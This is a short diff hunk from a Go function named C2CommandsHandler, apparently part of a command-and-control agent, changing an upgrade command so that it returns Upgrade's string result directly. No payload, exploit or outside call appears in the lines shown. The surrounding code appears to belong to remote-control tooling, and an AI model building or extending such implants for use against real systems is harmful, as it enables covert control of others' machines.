@@ -206,12 +206,8 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			return
 		}
 
-		out = "Done"
 		checksum := cmdSlice[1]
-		err = Upgrade(checksum)
-		if err != nil {
-			out = err.Error()
-		}
+		out = Upgrade(checksum)
 		return
 
 	default:
